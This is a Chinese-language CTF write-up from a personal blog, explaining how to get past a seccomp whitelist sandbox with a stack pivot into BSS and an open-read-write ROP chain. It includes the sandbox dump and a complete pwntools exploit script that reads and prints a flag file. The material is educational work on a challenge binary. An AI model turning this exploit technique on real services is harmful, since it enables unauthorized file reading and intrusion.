+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">install_seccomp</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp, __int64 a4, __int64 a5, __int64 a6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  LOWORD(v7) = <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, a6, v7, &amp;filter_3753) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(PR_SET_NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">    _exit(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v7);</span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);</span><br><span class="line">    _exit(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用seccomp-tools dump .&#x2F;rop查看沙箱规则</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0c</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0014</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x0a</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &gt;= <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0014</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x000001b5</span>  <span class="keyword">if</span> (A == <span class="number">0x1b5</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00050005</span>  <span class="keyword">return</span> ERRNO(<span class="number">5</span>)</span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
+
+<p>只有列出的这些指明了是allow还是kill（架构不符合），默认处理方式是ERRNO(5)（所以大概是白名单策略，默认拒绝）</p>
+<p>所以不能通过&#x2F;bin&#x2F;bash和execve这些，可以用ORW</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>基本思路就是open flag，read，write。这题因为栈空间不足还需要栈迁移，就在前面加一个迁移，迁移到bss段去写shellcode。然后还有一个问题是open打开文件需要的字符串（.&#x2F;flag）在程序里没有，所以要用read写入一个</p>
+<p>最后要调用的函数及参数如下：</p>
+<ol>
+<li>read(0, bss_base)，从标准输入读取payload2存入bss_base</li>
+<li>leave ;ret把rsp转移到bss_base，执行权转到payload2</li>
+<li>read(0, flag_str_addr)从标准输入读取到<code>./flag</code>字符存到flag_str_addr</li>
+<li>open(flag_str_addr, 0)，打开flag文件</li>
+<li>read(3, flag_addr)，从文件描述符3读取flag内容到flag_addr</li>
+<li>puts(flag_addr)，将flag内容写到标准输出</li>
+</ol>
+<blockquote>
+<p>调完exp之后：</p>
+</blockquote>
+<p>好多东西不写不知道啊。</p>
+<p>为什么不用设置read的长度（rdx的值）：是利用了寄存器的残余值，read跑完之后rdx还是0x150，够用（以及没有rdx的gadget，虽然非要整应该也不是不行）（以及笛子神说这是一个可以压缩rop链子长度的小trick）</p>
+<p>为什么不用write用puts：俺不知道。好像write得设rdx还是怎么，听说不好搞。反正puts更方便</p>
+<p>原来还要设一个rbp的值，前面学ORW理论知识的时候看大佬说要跳到目标地址-8，其实也就是因为有一条pop rbp会使rsp+8，如果不用-8这个方法，改在payload里写入rbp的值感觉还更有用，这样就可以完全自定义栈空间了（）设这个值也是有讲究的，不要破坏别人的空间以及够自己代码用，大概这样</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;new-window&quot;</span>]</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;./rop&#x27;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) </span><br><span class="line">p = process(file_path)</span><br><span class="line"><span class="comment"># p = remote(&#x27;124.16.75.116&#x27;, 52005)</span></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x4013AE&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Gadgets ---</span></span><br><span class="line">pop_rdi = <span class="number">0x401503</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401501</span></span><br><span class="line">leave_ret = <span class="number">0x4012c7</span> </span><br><span class="line">bss_base = elf.bss() + <span class="number">0x800</span> <span class="comment"># 选一个干净的 BSS 地址   0x404000+0xc00</span></span><br><span class="line">flag_addr = bss_base + <span class="number">0x500</span> <span class="comment"># 存flag的位置</span></span><br><span class="line">flag_str_addr = bss_base + <span class="number">0x600</span> <span class="comment"># 存&quot;./flag\x00&quot;字符串的位置</span></span><br><span class="line">open_plt = <span class="number">0x4012C9</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4919&#x27;</span>) </span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p64(bss_base) </span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15) + p64(bss_base) + p64(<span class="number">0</span>) + p64(read_plt) <span class="comment"># read(0, bss_base)，从标准输入读取payload2存入bss_base</span></span><br><span class="line">payload1 += p64(leave_ret) <span class="comment"># 转移rsp到bss_base</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = p64(bss_base + <span class="number">0x100</span>) <span class="comment"># pop到rbp，这里选一个合理一点的栈底</span></span><br><span class="line">payload2 += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15) + p64(flag_str_addr) + p64(<span class="number">0</span>) + p64(read_plt) <span class="comment"># read(0, flag_str_addr)从标准输入读取到`flag`字符存到flag_str_addr</span></span><br><span class="line">payload2 += p64(pop_rdi) + p64(flag_str_addr) + p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(open_plt) <span class="comment"># open(flag_str_addr, 0)，打开flag文件</span></span><br><span class="line">payload2 += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_r15) + p64(flag_addr) + p64(<span class="number">0</span>) + p64(read_plt) <span class="comment"># read(3, flag_addr)，从文件描述符3读取flag内容到flag_addr</span></span><br><span class="line"><span class="comment"># payload2 += p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(flag_addr) + p64(0) + p64(write_plt) # write(1, flag_addr)，将flag内容写到标准输出</span></span><br><span class="line">payload2 += p64(pop_rdi) + p64(flag_addr) + p64(puts_plt)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>最后，没有远程环境了只能自己建个flag文件打打本地了。大概没问题吧</p>
+<p><img src="/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/image-20260331215742304.png" alt="image-20260331215742304"></p>
+<h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><p>pwn✌️说这题也可以打多次ret2csu</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Mintind
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://mintind.github.io/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/" title="ORW (Open-Read-Write)策略&amp;栈迁移">https://mintind.github.io/2026/03/23/CTF/PWN/ORW&栈迁移/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/03/19/CTF/Reverse/%E8%87%AA%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81Self-Modified%20Code_SMC/" rel="prev" title="自修改代码Self-Modified Code（SMC）">
+                  <i class="fa fa-angle-left"></i> 自修改代码Self-Modified Code（SMC）
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/03/30/CTF/Web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="web反序列化漏洞利用课堂练习">
+                  web反序列化漏洞利用课堂练习 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+  <div class="languages">
+    <label class="lang-select-label">
+      <i class="fa fa-language"></i>
+      <span>简体中文</span>
+      <i class="fa fa-angle-up" aria-hidden="true"></i>
+    </label>
+    <select class="lang-select" data-canonical="" aria-label="选择语言">
+      
+        <option value="zh-CN" data-href="/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/" selected="">
+          简体中文
+        </option>
+      
+        <option value="en" data-href="/en/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/" selected="">
+          English
+        </option>
+      
+    </select>
+  </div>
+
+  <div class="copyright">
+    &copy; 2025 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Mintind</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">203k</span>
+  </span>
+</div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
